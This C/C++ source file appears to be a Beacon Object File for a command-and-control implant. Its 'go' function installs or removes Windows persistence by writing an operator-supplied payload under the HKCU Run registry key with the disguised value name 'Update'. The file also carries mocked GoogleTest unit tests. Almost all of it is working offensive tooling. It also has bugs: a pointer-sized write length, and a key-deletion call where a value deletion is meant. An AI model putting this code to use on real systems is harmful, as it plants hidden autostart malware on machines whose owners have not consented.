#include <windows.h>
#include "..\Core\base\helpers.h"

#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "..\Core\base\mock.h"
#endif

#if defined(_GTEST)
#include <gtest\gtest.h>
using m_InstallRunKey = bool(*)(char* payload);
using m_RemoveRunKey = bool(*)();

m_InstallRunKey InstallRunKey = nullptr;
m_RemoveRunKey RemoveRunKey = nullptr;

class MockedFunctions : public ::testing::Test {
protected:
	void SetUp() override {
		InstallRunKey = [](char* payload) -> bool {
			return true; // Mocked function always returns false
			};
		RemoveRunKey = []() -> bool {
			return true; // Mocked function always returns true
			};
	}
    void TearDown() override {
        InstallRunKey = nullptr;
        RemoveRunKey = nullptr;
    }
};
#else
#include "..\Core\beacon.h"
#include "..\Core\sleepmask.h"

extern "C" {
    DFR(KERNEL32, GetLastError);
    DFR(ADVAPI, RegCreateKeyA);
    DFR(ADVAPI, RegSetKeyValueA);
    DFR(ADVAPI, RegCloseKey);
    DFR(ADVAPI, RegOpenKeyExA);
    DFR(ADVAPI, RegDeleteKeyA);
}
#define GetLastError KERNEL32$GetLastError
#define RegCreateKeyA ADVAPI$RegCreateKeyA
#define RegSetKeyValueA ADVAPI$RegSetKeyValueA
#define RegCloseKey ADVAPI$RegCloseKey
#define RegOpenKeyExA ADVAPI$RegOpenKeyExA
#define RegDeleteKeyA ADVAPI$RegDeleteKeyA

bool InstallRunKey(char* payload) {
    HKEY hKey;

    //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    if (RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Error opening registry key: %i", GetLastError());
        return false;
    }

    LSTATUS status = RegSetKeyValueA(hKey, "Update", 0, REG_SZ, payload, sizeof(payload));
    RegCloseKey(hKey);

    if (status == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Run key successfully set.");
        return true;
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Error setting run key: %i", GetLastError());
        return false;
    }
}

bool RemoveRunKey() {
    HKEY hKey;
    //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Error opening registry key: %i", GetLastError());
        return false;
    }

    LSTATUS status = RegDeleteKeyA(hKey, "Update");
    RegCloseKey(hKey);

    if (status == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Run key successfully removed.");
        return true;
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Error removing run key: %i", GetLastError());
        return false;
    }
}
#endif

extern "C" {
    void go(char* args, int len) {
        datap parser;
        BeaconDataParse(&parser, args, len);
        int installOption = BeaconDataInt(&parser);

        if (installOption == 1) {
            char* payload = BeaconDataExtract(&parser, &len);
            if (!InstallRunKey(payload)) {
                BeaconPrintf(CALLBACK_ERROR, "An error occured when attempting to install persistence");
            }
        }
        else if (installOption == 0) {
            if (!RemoveRunKey()) {
                BeaconPrintf(CALLBACK_ERROR, "An error occured when attempting to remove persistence");
            }
        }
        else
            BeaconPrintf(CALLBACK_ERROR, "Invalid option. Use 1 to install or 0 to remove the run key.");
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)
#pragma comment(lib, "Advapi32.lib")

int main(int argc, char* argv[]) {
	printf("Installing Persistence");
    bof::runMocked<int, const char*>(go, 1, "TESTRUN");
    
    //printf("Cleaning up Persistence");
    //bof::runMocked<int, const char*>(go, 0, "");

    return 0;
}

// Define unit tests
#elif defined(_GTEST)
namespace UnitTest {
    TEST_F(MockedFunctions, SetPersistenceFails) {
        InstallRunKey = [](char* payload) -> bool {return false;};

        std::vector<bof::output::OutputEntry> got =
            bof::runMocked<int, char*>(go, 1, "TESTRUN");

        bof::output::OutputEntry lastOutput = got.back();
        ASSERT_EQ(lastOutput.callbackType, CALLBACK_ERROR);
    }

    TEST_F(MockedFunctions, SetPersistenceSuccess) {
        std::vector<bof::output::OutputEntry> got =
            bof::runMocked<int, char*>(go, 1, "TESTRUN");

        ASSERT_EQ(got.size(), 0);
    }

    TEST_F(MockedFunctions, DeletingKeyValueFails) {
        RemoveRunKey = []() -> bool {return false; };

        std::vector<bof::output::OutputEntry> got =
            bof::runMocked<int, char*>(go, 0, "");

        bof::output::OutputEntry lastOutput = got.back();
        ASSERT_EQ(lastOutput.callbackType, CALLBACK_ERROR);
    }

    TEST_F(MockedFunctions, DeletingKeyValueSuccess) {
        std::vector<bof::output::OutputEntry> got =
            bof::runMocked<int, char*>(go, 0, "");

        ASSERT_EQ(got.size(), 0);
    }
}
#endif